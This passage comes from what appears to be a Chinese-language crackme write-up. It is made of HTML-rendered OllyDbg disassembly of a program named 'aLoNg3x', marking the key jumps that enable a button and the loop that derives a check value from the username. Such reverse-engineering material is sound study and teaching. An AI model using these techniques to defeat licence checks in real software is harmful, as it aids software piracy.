class="hljs-number">8</span>B<span class="hljs-number">83</span> D<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>D<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442E22</span>  |.  <span class="hljs-number">8078</span> <span class="hljs-number">47</span> <span class="hljs-number">00</span>    cmp byte ptr ds:[eax+<span class="hljs-number">0</span>x<span class="hljs-number">47</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E26</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">0</span>F         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">37</span>              ;  关键跳转<span class="hljs-number">1</span><br><span class="hljs-attribute">00442E28</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442E2A</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442E30</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442E32</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442E35</span>  |.  EB <span class="hljs-number">49</span>         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">80</span><br><span class="hljs-attribute">00442E37</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442E3A</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442E40</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">7</span>B<span class="hljs-number">04</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E45</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> FC       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]           ;  user<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">17276</span><br><span class="hljs-attribute">00442E48</span>  |.  <span class="hljs-number">50</span>            push eax<br><span class="hljs-attribute">00442E49</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442E4C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> DC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>DC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442E52</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">6904</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442E57</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442E5A</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E5B</span>  |.  E<span class="hljs-number">8</span> DCFBFFFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>A<span class="hljs-number">3</span>C<br><span class="hljs-attribute">00442E60</span>  |.  <span class="hljs-number">84</span>C<span class="hljs-number">0</span>          test al,al<br><span class="hljs-attribute">00442E62</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">0</span>F         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">73</span>               ;  关键跳转<span class="hljs-number">2</span><br><span class="hljs-attribute">00442E64</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442E66</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442E6C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442E6E</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442E71</span>  |.  EB <span class="hljs-number">0</span>D         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">80</span><br><span class="hljs-attribute">00442E73</span>  |&gt;  <span class="hljs-number">33</span>D<span class="hljs-number">2</span>          xor edx,edx<br><span class="hljs-attribute">00442E75</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]<br><span class="hljs-attribute">00442E7B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442E7D</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]<br><span class="hljs-attribute">00442E80</span>  |&gt;  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442E82</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E83</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E84</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442E85</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8910</span>       mov dword ptr fs:[eax],edx<br><span class="hljs-attribute">00442E88</span>  |.  <span class="hljs-number">68</span> A<span class="hljs-number">22</span>E<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>EA<span class="hljs-number">2</span><br><span class="hljs-attribute">00442E8D</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442E90</span>  |.  BA <span class="hljs-number">02000000</span>   mov edx,<span class="hljs-number">0</span>x<span class="hljs-number">2</span><br><span class="hljs-attribute">00442E95</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">4209</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>DC<br><span class="hljs-attribute">00442E9A</span>  \.  C<span class="hljs-number">3</span>            retn<br><span class="hljs-attribute">00442E9B</span>   .^ E<span class="hljs-number">9</span> D<span class="hljs-number">803</span>FCFF   jmp aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00403278</span><br><span class="hljs-attribute">00442EA0</span>   .^ EB EB         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>E<span class="hljs-number">8</span>D<br><span class="hljs-attribute">00442EA2</span>   .  <span class="hljs-number">5</span>B            pop ebx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA3</span>   .  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA4</span>   .  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA5</span>   .  <span class="hljs-number">5</span>D            pop ebp                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442EA6</span>   .  C<span class="hljs-number">3</span>            retn<br><br><br></code></pre></div></td></tr></table></figure><p>codicechange：</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442C78</span>  /.  <span class="hljs-number">55</span>            push ebp                                 ;  codiceChange<br><span class="hljs-attribute">00442C79</span>  |.  <span class="hljs-number">8</span>BEC          mov ebp,esp<br><span class="hljs-attribute">00442C7B</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">9</span>          xor ecx,ecx<br><span class="hljs-attribute">00442C7D</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C7E</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C7F</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C80</span>  |.  <span class="hljs-number">51</span>            push ecx<br><span class="hljs-attribute">00442C81</span>  |.  <span class="hljs-number">53</span>            push ebx<br><span class="hljs-attribute">00442C82</span>  |.  <span class="hljs-number">56</span>            push esi<br><span class="hljs-attribute">00442C83</span>  |.  <span class="hljs-number">8</span>BD<span class="hljs-number">8</span>          mov ebx,eax<br><span class="hljs-attribute">00442C85</span>  |.  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442C87</span>  |.  <span class="hljs-number">55</span>            push ebp<br><span class="hljs-attribute">00442C88</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">562</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">56</span><br><span class="hljs-attribute">00442C8D</span>  |.  <span class="hljs-number">64</span>:FF<span class="hljs-number">30</span>       push dword ptr fs:[eax]<br><span class="hljs-attribute">00442C90</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8920</span>       mov dword ptr fs:[eax],esp<br><span class="hljs-attribute">00442C93</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442C96</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442C9C</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">1</span>F<span class="hljs-number">06</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CA1</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442CA4</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> FC       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]<br><span class="hljs-attribute">00442CA7</span>  |.  E<span class="hljs-number">8</span> ACFCFBFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00402958</span><br><span class="hljs-attribute">00442CAC</span>  |.  <span class="hljs-number">8</span>BF<span class="hljs-number">0</span>          mov esi,eax<br><span class="hljs-attribute">00442CAE</span>  |.  <span class="hljs-number">837</span>D FC <span class="hljs-number">00</span>    cmp dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CB2</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">18</span>         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>CCC<br><span class="hljs-attribute">00442CB4</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">4</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442CB7</span>  |.  <span class="hljs-number">8</span>BC<span class="hljs-number">6</span>          mov eax,esi<br><span class="hljs-attribute">00442CB9</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">8249</span>FCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00407640</span><br><span class="hljs-attribute">00442CBE</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">55</span> F<span class="hljs-number">4</span>       mov edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442CC1</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442CC7</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">2406</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>F<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CCC</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> D<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>D<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442CD2</span>  |.  <span class="hljs-number">8078</span> <span class="hljs-number">47</span> <span class="hljs-number">00</span>    cmp byte ptr ds:[eax+<span class="hljs-number">0</span>x<span class="hljs-number">47</span>],<span class="hljs-number">0</span>x<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CD6</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">0</span>F         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>CE<span class="hljs-number">7</span>              ;  关键跳转<span class="hljs-number">1</span><br><span class="hljs-attribute">00442CD8</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442CDA</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442CE0</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442CE2</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442CE5</span>  |.  EB <span class="hljs-number">49</span>         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">30</span><br><span class="hljs-attribute">00442CE7</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">8</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442CEA</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> E<span class="hljs-number">0020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>E<span class="hljs-number">0</span>]<br><span class="hljs-attribute">00442CF0</span>  |.  E<span class="hljs-number">8</span> CB<span class="hljs-number">05</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442CF5</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442CF8</span>  |.  <span class="hljs-number">50</span>            push eax<br><span class="hljs-attribute">00442CF9</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">55</span> F<span class="hljs-number">0</span>       lea edx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>]<br><span class="hljs-attribute">00442CFC</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> DC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>DC]<br><span class="hljs-attribute">00442D02</span>  |.  E<span class="hljs-number">8</span> B<span class="hljs-number">905</span>FEFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004232</span>C<span class="hljs-number">0</span><br><span class="hljs-attribute">00442D07</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">0</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>]<br><span class="hljs-attribute">00442D0A</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D0B</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">2</span>CFDFFFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>A<span class="hljs-number">3</span>C<br><span class="hljs-attribute">00442D10</span>  |.  <span class="hljs-number">84</span>C<span class="hljs-number">0</span>          test al,al<br><span class="hljs-attribute">00442D12</span>  |.  <span class="hljs-number">74</span> <span class="hljs-number">0</span>F         je short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">23</span>               ;  关键跳转<span class="hljs-number">2</span><br><span class="hljs-attribute">00442D14</span>  |.  B<span class="hljs-number">2</span> <span class="hljs-number">01</span>         mov dl,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442D16</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442D1C</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442D1E</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]             ;  IsEnableWindow<br><span class="hljs-attribute">00442D21</span>  |.  EB <span class="hljs-number">0</span>D         jmp short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">30</span><br><span class="hljs-attribute">00442D23</span>  |&gt;  <span class="hljs-number">33</span>D<span class="hljs-number">2</span>          xor edx,edx<br><span class="hljs-attribute">00442D25</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">83</span> CC<span class="hljs-number">020000</span> mov eax,dword ptr ds:[ebx+<span class="hljs-number">0</span>x<span class="hljs-number">2</span>CC]         ;  comctl_<span class="hljs-number">1</span>.<span class="hljs-number">74646957</span><br><span class="hljs-attribute">00442D2B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">08</span>          mov ecx,dword ptr ds:[eax]               ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0044282</span>C<br><span class="hljs-attribute">00442D2D</span>  |.  FF<span class="hljs-number">51</span> <span class="hljs-number">60</span>       call dword ptr ds:[ecx+<span class="hljs-number">0</span>x<span class="hljs-number">60</span>]<br><span class="hljs-attribute">00442D30</span>  |&gt;  <span class="hljs-number">33</span>C<span class="hljs-number">0</span>          xor eax,eax<br><span class="hljs-attribute">00442D32</span>  |.  <span class="hljs-number">5</span>A            pop edx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D33</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D34</span>  |.  <span class="hljs-number">59</span>            pop ecx                                  ;  aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">0041</span>E<span class="hljs-number">13</span>E<br><span class="hljs-attribute">00442D35</span>  |.  <span class="hljs-number">64</span>:<span class="hljs-number">8910</span>       mov dword ptr fs:[eax],edx<br><span class="hljs-attribute">00442D38</span>  |.  <span class="hljs-number">68</span> <span class="hljs-number">5</span>D<span class="hljs-number">2</span>D<span class="hljs-number">4400</span>   push aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>D<span class="hljs-number">5</span>D<br><span class="hljs-attribute">00442D3D</span>  |&gt;  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">0</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">10</span>]<br><span class="hljs-attribute">00442D40</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">730</span>AFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442D45</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">4</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>xC]<br><span class="hljs-attribute">00442D48</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">6</span>B<span class="hljs-number">0</span>AFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442D4D</span>  |.  <span class="hljs-number">8</span>D<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       lea eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442D50</span>  |.  E<span class="hljs-number">8</span> <span class="hljs-number">630</span>AFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">004037</span>B<span class="hljs-number">8</span><br><span class="hljs-attribute">00442D55</span>  \.  C<span class="hljs-number">3</span>            retn<br></code></pre></div></td></tr></table></figure><p>尝试在eax+0x47这下硬件写入断点，发现并不能断下来，说明还是没有满足某个条件。</p><p>看第二个关键函数，可以看到一个计算，通过用户名算出serial，懒得再解释了QAQ，直接看下面代码吧。</p><figure class="highlight apache"><table><tr><td class="gutter hljs"><div class="hljs code-wrapper"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></div></td><td class="code"><div class="hljs code-wrapper"><pre><code class="hljs apache"><span class="hljs-attribute">00442A8E</span>  |.  B<span class="hljs-number">8</span> <span class="hljs-number">01000000</span>   mov eax,<span class="hljs-number">0</span>x<span class="hljs-number">1</span><br><span class="hljs-attribute">00442A93</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">4</span>D FC       /mov ecx,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]          ;  user<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">17276</span><br><span class="hljs-attribute">00442A96</span>  |.  <span class="hljs-number">0</span>FB<span class="hljs-number">64</span>C<span class="hljs-number">01</span> FF   |movzx ecx,byte ptr ds:[ecx+eax-<span class="hljs-number">0</span>x<span class="hljs-number">1</span>]<br><span class="hljs-attribute">00442A9B</span>  |.  <span class="hljs-number">8</span>B<span class="hljs-number">75</span> FC       |mov esi,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">4</span>]          ;  user<span class="hljs-number">32</span>.<span class="hljs-number">75</span>B<span class="hljs-number">17276</span><br><span class="hljs-attribute">00442A9E</span>  |.  <span class="hljs-number">0</span>FB<span class="hljs-number">63406</span>      |movzx esi,byte ptr ds:[esi+eax]<br><span class="hljs-attribute">00442AA2</span>  |.  <span class="hljs-number">0</span>FAFCE        |imul ecx,esi<br><span class="hljs-attribute">00442AA5</span>  |.  <span class="hljs-number">0</span>FAFC<span class="hljs-number">8</span>        |imul ecx,eax<br><span class="hljs-attribute">00442AA8</span>  |.  <span class="hljs-number">03</span>D<span class="hljs-number">9</span>          |add ebx,ecx<br><span class="hljs-attribute">00442AAA</span>  |.  <span class="hljs-number">40</span>            |inc eax<br><span class="hljs-attribute">00442AAB</span>  |.  <span class="hljs-number">4</span>A            |dec edx<br><span class="hljs-attribute">00442AAC</span>  |.^ <span class="hljs-number">75</span> E<span class="hljs-number">5</span>         \jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>A<span class="hljs-number">93</span><br><span class="hljs-attribute">00442AAE</span>  |&gt;  <span class="hljs-number">8</span>B<span class="hljs-number">45</span> F<span class="hljs-number">8</span>       mov eax,dword ptr ss:[ebp-<span class="hljs-number">0</span>x<span class="hljs-number">8</span>]<br><span class="hljs-attribute">00442AB1</span>  |.  E<span class="hljs-number">8</span> BA<span class="hljs-number">4</span>BFCFF   call aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00407670</span><br><span class="hljs-attribute">00442AB6</span>  |.  <span class="hljs-number">2</span>BD<span class="hljs-number">8</span>          sub ebx,eax<br><span class="hljs-attribute">00442AB8</span>  |.  <span class="hljs-number">81</span>FB <span class="hljs-number">9</span>A<span class="hljs-number">020000</span> cmp ebx,<span class="hljs-number">0</span>x<span class="hljs-number">29</span>A<br><span class="hljs-attribute">00442ABE</span>  |.  <span class="hljs-number">75</span> <span class="hljs-number">04</span>         jnz short aLoNg<span class="hljs-number">3</span>x_.<span class="hljs-number">00442</span>AC<span class="hljs-number">4</span><br></code></pre></div></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter hljs"><div class="hljs 